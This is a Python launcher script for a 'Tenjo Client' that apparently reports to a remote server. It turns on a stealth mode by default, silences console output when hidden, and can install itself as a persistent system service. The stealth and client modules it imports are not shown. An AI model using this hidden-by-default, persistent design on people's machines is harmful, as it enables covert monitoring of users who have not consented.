#!/usr/bin/env python3
"""
Tenjo Client - Startup Script
Handles client initialization, configuration, and service management
"""

import os
import sys
import time
import logging
import argparse
import signal
from pathlib import Path

# Add src directory to Python path
current_dir = Path(__file__).parent
src_dir = current_dir / 'src'
sys.path.insert(0, str(src_dir))

# Import after path setup
try:
    from core.config import Config
    from utils.stealth import StealthManager
    from main import TenjoClient
except ImportError as e:
    print(f"Error importing modules: {e}")
    print("Make sure all required modules are installed and paths are correct.")
    sys.exit(1)

class TenjoStartup:
    def __init__(self, server_url=None, stealth_mode=True):
        self.server_url = server_url or Config.SERVER_URL
        self.stealth_mode = stealth_mode
        self.client = None
        self.stealth_manager = None
        self.running = False
        
        # Setup logging
        self.setup_logging()
        
    def setup_logging(self):
        """Setup logging configuration"""
        log_dir = current_dir / 'src' / 'logs'
        log_dir.mkdir(exist_ok=True)
        
        log_file = log_dir / f'tenjo_startup_{time.strftime("%Y%m%d")}.log'
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler() if not self.stealth_mode else logging.NullHandler()
            ]
        )
        
        self.logger = logging.getLogger(__name__)
        
    def setup_stealth(self):
        """Initialize stealth mode if enabled"""
        if self.stealth_mode:
            try:
                self.stealth_manager = StealthManager()
                self.stealth_manager.enable_stealth_mode()
                self.logger.info("Stealth mode enabled")
            except Exception as e:
                self.logger.warning(f"Could not enable stealth mode: {e}")
                
    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        self.logger.info(f"Received signal {signum}, shutting down...")
        self.shutdown()
        
    def shutdown(self):
        """Graceful shutdown"""
        self.running = False
        
        if self.client:
            try:
                self.client.stop()
                self.logger.info("Client stopped successfully")
            except Exception as e:
                self.logger.error(f"Error stopping client: {e}")
                
        if self.stealth_manager:
            try:
                self.stealth_manager.disable_stealth_mode()
                self.logger.info("Stealth mode disabled")
            except Exception as e:
                self.logger.warning(f"Error disabling stealth mode: {e}")
                
        sys.exit(0)
        
    def start(self):
        """Start the Tenjo client"""
        try:
            # Setup signal handlers
            signal.signal(signal.SIGINT, self.signal_handler)
            signal.signal(signal.SIGTERM, self.signal_handler)
            
            self.logger.info("Starting Tenjo Client...")
            self.logger.info(f"Server URL: {self.server_url}")
            self.logger.info(f"Stealth Mode: {self.stealth_mode}")
            
            # Setup stealth mode
            self.setup_stealth()
            
            # Initialize and start client
            self.client = TenjoClient(server_url=self.server_url)
            self.running = True
            
            self.logger.info("Tenjo client initialized successfully")
            
            # Start client in main thread
            self.client.start()
            
            # Keep running
            while self.running:
                time.sleep(1)
                
        except KeyboardInterrupt:
            self.logger.info("Interrupted by user")
            self.shutdown()
        except Exception as e:
            self.logger.error(f"Fatal error: {e}")
            self.shutdown()
            
    def install_service(self):
        """Install as system service (platform specific)"""
        try:
            if self.stealth_manager:
                self.stealth_manager.install_service()
                self.logger.info("Service installed successfully")
            else:
                self.logger.error("Stealth manager not initialized")
        except Exception as e:
            self.logger.error(f"Failed to install service: {e}")
            
    def uninstall_service(self):
        """Uninstall system service"""
        try:
            if self.stealth_manager:
                self.stealth_manager.uninstall_service()
                self.logger.info("Service uninstalled successfully")
            else:
                self.logger.error("Stealth manager not initialized")
        except Exception as e:
            self.logger.error(f"Failed to uninstall service: {e}")

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='Tenjo Client Startup Script')
    parser.add_argument('--server-url', '-s', 
                       help='Server URL (default: from config)')
    parser.add_argument('--no-stealth', action='store_true',
                       help='Disable stealth mode')
    parser.add_argument('--install-service', action='store_true',
                       help='Install as system service')
    parser.add_argument('--uninstall-service', action='store_true',
                       help='Uninstall system service')
    parser.add_argument('--debug', action='store_true',
                       help='Enable debug logging')
    
    args = parser.parse_args()
    
    # Create startup instance
    startup = TenjoStartup(
        server_url=args.server_url,
        stealth_mode=not args.no_stealth
    )
    
    # Handle service management
    if args.install_service:
        startup.setup_stealth()
        startup.install_service()
        return
        
    if args.uninstall_service:
        startup.setup_stealth()
        startup.uninstall_service()
        return
    
    # Start normal operation
    startup.start()

if __name__ == '__main__':
    main()